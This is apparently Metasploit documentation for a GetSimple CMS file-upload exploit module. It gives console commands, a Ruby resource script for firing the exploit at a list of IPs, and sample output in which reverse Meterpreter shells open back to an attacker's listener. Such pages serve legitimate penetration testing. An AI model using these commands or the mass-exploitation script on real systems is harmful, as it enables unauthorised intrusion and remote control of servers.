## GetSimpleCMS PHP File Upload Vulnerability

---

This module exploits a file upload vulnerability in GetSimple CMS. By abusing the upload.php file, a malicious authenticated user can upload an arbitrary file, including PHP code, which results in arbitrary code execution.

## Module Name

---

exploit/unix/webapp/get_simple_cms_upload_exec

## Authors

---

- Ahmed Elhady Mohamed

## Platforms

---

php

## Module Ranking

---

**Excellent**

> The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances.

## Module Traits

---

## Related Pull Requests

---

GITHUB_OAUTH_TOKEN environment variable not set. [See how](https://help.github.com/articles/creating-an-access-token-for-command-line-use/)

## References

---

- CVE: [Not available](https://docs.metasploit.com/docs/using-metasploit/other/why-cve-is-not-available.html)
- [EDB-25405](https://www.exploit-db.com/exploits/25405)
- OSVDB (93034)

## Available Targets

---

- Generic (PHP Payload)

## Required Options

---

- **RHOSTS:** The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
    
- **USERNAME:** The username that will be used for authentication process
    
- **PASSWORD:** The right password for the provided username
    

## Basic Usage

---

**Using get_simple_cms_upload_exec against a single host**

Normally, you can use exploit/unix/webapp/get_simple_cms_upload_exec this way:

```
msf > use exploit/unix/webapp/get_simple_cms_upload_exec
msf exploit(get_simple_cms_upload_exec) > show targets
    ... a list of targets ...
msf exploit(get_simple_cms_upload_exec) > set TARGET target-id
msf exploit(get_simple_cms_upload_exec) > show options
    ... show and set options ...
msf exploit(get_simple_cms_upload_exec) > exploit
```

**Using get_simple_cms_upload_exec against multiple hosts**

But it looks like this is a remote exploit module, which means you can also engage multiple hosts.

First, create a list of IPs you wish to exploit with this module. One IP per line.

Second, set up a background payload listener. This payload should be the same as the one your get_simple_cms_upload_exec will be using:

1. Do: `use exploit/multi/handler`
2. Do: `set PAYLOAD [payload]`
3. Set other options required by the payload
4. Do: `set EXITONSESSION false`
5. Do: `run -j`

At this point, you should have a payload listening.

Next, create the following script. Notice you will probably need to modify the ip_list path, and payload options accordingly:

```
&#x3c;ruby&#x3e;
#
# Modify the path if necessary
#
ip_list = '/tmp/ip_list.txt'

File.open(ip_list, 'rb').each_line do |ip|
  print_status("Trying against #{ip}")
  run_single("use exploit/unix/webapp/get_simple_cms_upload_exec")
  run_single("set RHOST #{ip}")
  run_single("set DisablePayloadHandler true")

  #
  # Set a payload that's the same as the handler.
  # You might also need to add more run_single commands to configure other
  # payload options.
  #
  run_single("set PAYLOAD [payload name]")

  run_single("run")
end
&#x3c;/ruby&#x3e;
```

Next, run the resource script in the console:

```
msf > resource [path-to-resource-script]
```

And finally, you should see that the exploit is trying against those hosts similar to the following MS08-067 example:

```
msf > resource /tmp/exploit_hosts.rc
[*] Processing /tmp/exploit_hosts.rc for ERB directives.
[*] resource (/tmp/exploit_hosts.rc)> Ruby Code (402 bytes)
[*] Trying against 192.168.1.80

RHOST => 192.168.1.80
DisablePayloadHandler => true
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.199

[*] 192.168.1.80:445 - Automatically detecting the target...
[*] 192.168.1.80:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 192.168.1.80:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 192.168.1.80:445 - Attempting to trigger the vulnerability...
[*] Sending stage (957999 bytes) to 192.168.1.80
[*] Trying against 192.168.1.109
RHOST => 192.168.1.109
DisablePayloadHandler => true
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.1.199
[*] 192.168.1.109:445 - Automatically detecting the target...
[*] 192.168.1.109:445 - Fingerprint: Windows 2003 - Service Pack 2 - lang:Unknown
[*] 192.168.1.109:445 - We could not detect the language pack, defaulting to English
[*] 192.168.1.109:445 - Selected Target: Windows 2003 SP2 English (NX)
[*] 192.168.1.109:445 - Attempting to trigger the vulnerability...
[*] Meterpreter session 1 opened (192.168.1.199:4444 -> 192.168.1.80:1071) at 2016-03-02 19:32:49 -0600

[*] Sending stage (957999 bytes) to 192.168.1.109
[*] Meterpreter session 2 opened (192.168.1.199:4444 -> 192.168.1.109:4626) at 2016-03-02 19:32:52 -0600
```